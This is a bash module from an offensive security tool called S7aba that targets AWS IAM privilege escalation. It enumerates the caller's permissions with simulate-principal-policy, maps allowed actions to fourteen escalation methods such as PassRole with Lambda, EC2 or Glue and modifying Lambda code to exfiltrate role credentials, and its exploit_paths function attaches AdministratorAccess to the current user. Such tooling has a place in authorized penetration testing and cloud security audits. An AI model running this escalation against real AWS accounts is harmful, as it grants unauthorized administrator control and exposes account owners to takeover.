#!/usr/bin/env bash
# S7aba - AWS Privilege Escalation Module
# Reference: Rhino Security Labs - AWS IAM Privilege Escalation Methods

declare -a ESCALATION_PATHS=()

analyze_permissions() {
    log_info "Analyzing IAM permissions for escalation vectors..."

    local username
    username=$(aws iam get-user --query 'User.UserName' --output text 2>/dev/null)
    [[ -z "$username" || "$username" == "None" ]] && {
        log_warn "Could not determine IAM username, checking role permissions..."
        return
    }

    # Simulate key IAM actions
    local dangerous_actions=(
        "iam:CreatePolicyVersion"
        "iam:SetDefaultPolicyVersion"
        "iam:PassRole"
        "iam:CreateLoginProfile"
        "iam:UpdateLoginProfile"
        "iam:AttachUserPolicy"
        "iam:AttachGroupPolicy"
        "iam:AttachRolePolicy"
        "iam:PutUserPolicy"
        "iam:PutGroupPolicy"
        "iam:PutRolePolicy"
        "iam:AddUserToGroup"
        "iam:UpdateAssumeRolePolicy"
        "iam:CreateAccessKey"
        "lambda:CreateFunction"
        "lambda:InvokeFunction"
        "lambda:UpdateFunctionCode"
        "sts:AssumeRole"
        "ec2:RunInstances"
        "cloudformation:CreateStack"
        "datapipeline:CreatePipeline"
        "glue:CreateDevEndpoint"
        "ssm:SendCommand"
    )

    for action in "${dangerous_actions[@]}"; do
        local result
        result=$(aws iam simulate-principal-policy \
            --policy-source-arn "$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null)" \
            --action-names "$action" \
            --query 'EvaluationResults[0].EvalDecision' --output text 2>/dev/null)

        if [[ "$result" == "allowed" ]]; then
            log_debug "Allowed: $action"
            ESCALATION_PATHS+=("$action")
        fi
    done
}

find_escalation_paths() {
    local paths=""

    # Method 1: CreatePolicyVersion
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:CreatePolicyVersion" ]]; then
        paths+="HIGH|CreatePolicyVersion|Create new policy version with AdministratorAccess and set as default\n"
    fi

    # Method 2: SetDefaultPolicyVersion
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:SetDefaultPolicyVersion" ]]; then
        paths+="HIGH|SetDefaultPolicyVersion|Switch to an older more permissive policy version\n"
    fi

    # Method 3: PassRole + Lambda
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:PassRole" ]] && [[ " ${ESCALATION_PATHS[*]} " =~ "lambda:CreateFunction" ]]; then
        paths+="HIGH|PassRole+Lambda|Pass admin role to new Lambda function and invoke it\n"
    fi

    # Method 4: PassRole + EC2
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:PassRole" ]] && [[ " ${ESCALATION_PATHS[*]} " =~ "ec2:RunInstances" ]]; then
        paths+="HIGH|PassRole+EC2|Launch EC2 instance with admin instance profile\n"
    fi

    # Method 5: AttachUserPolicy
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:AttachUserPolicy" ]]; then
        paths+="CRITICAL|AttachUserPolicy|Attach AdministratorAccess directly to current user\n"
    fi

    # Method 6: AttachGroupPolicy
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:AttachGroupPolicy" ]]; then
        paths+="HIGH|AttachGroupPolicy|Attach admin policy to a group the user belongs to\n"
    fi

    # Method 7: PutUserPolicy
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:PutUserPolicy" ]]; then
        paths+="CRITICAL|PutUserPolicy|Add inline admin policy directly to user\n"
    fi

    # Method 8: AddUserToGroup
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:AddUserToGroup" ]]; then
        paths+="HIGH|AddUserToGroup|Add user to admin group\n"
    fi

    # Method 9: UpdateAssumeRolePolicy
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:UpdateAssumeRolePolicy" ]]; then
        paths+="HIGH|UpdateAssumeRolePolicy|Modify admin role trust policy to allow assumption\n"
    fi

    # Method 10: PassRole + CloudFormation
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:PassRole" ]] && [[ " ${ESCALATION_PATHS[*]} " =~ "cloudformation:CreateStack" ]]; then
        paths+="HIGH|PassRole+CloudFormation|Create CFN stack with admin role to execute arbitrary actions\n"
    fi

    # Method 11: Lambda UpdateFunctionCode
    if [[ " ${ESCALATION_PATHS[*]} " =~ "lambda:UpdateFunctionCode" ]]; then
        paths+="MEDIUM|LambdaCodeInjection|Modify existing Lambda function code to exfil role credentials\n"
    fi

    # Method 12: SSM Command Execution
    if [[ " ${ESCALATION_PATHS[*]} " =~ "ssm:SendCommand" ]]; then
        paths+="HIGH|SSMCommand|Execute commands on EC2 instances via SSM agent\n"
    fi

    # Method 13: CreateAccessKey
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:CreateAccessKey" ]]; then
        paths+="MEDIUM|CreateAccessKey|Create access keys for other users\n"
    fi

    # Method 14: Glue Dev Endpoint
    if [[ " ${ESCALATION_PATHS[*]} " =~ "iam:PassRole" ]] && [[ " ${ESCALATION_PATHS[*]} " =~ "glue:CreateDevEndpoint" ]]; then
        paths+="HIGH|PassRole+Glue|Create Glue dev endpoint with admin role and SSH access\n"
    fi

    echo -e "$paths"
}

exploit_paths() {
    local paths="$1"
    log_warn "Exploitation module loaded - select a path to attempt"
    log_info "Exploitation requires explicit selection and is logged"

    echo "$paths" | while IFS='|' read -r risk method description; do
        [[ -z "$method" ]] && continue
        echo -e "  ${YELLOW}→${RESET} ${method}"
    done

    echo ""
    read -rp "$(echo -e "${YELLOW}[?] Enter method name to attempt: ${RESET}")" selected

    case "$selected" in
        AttachUserPolicy)
            log_warn "Attempting AttachUserPolicy escalation..."
            local user_arn
            user_arn=$(aws sts get-caller-identity --query 'Arn' --output text)
            local username
            username=$(echo "$user_arn" | grep -oP '(?<=user/)[^/]+$')

            if [[ $DRY_RUN -eq 1 ]]; then
                log_info "DRY-RUN: Would attach arn:aws:iam::aws:policy/AdministratorAccess to $username"
            else
                aws iam attach-user-policy \
                    --user-name "$username" \
                    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>/dev/null
                log_success "AdministratorAccess attached to $username"
            fi
            ;;
        *)
            log_warn "Method '$selected' not yet automated - manual exploitation required"
            ;;
    esac
}
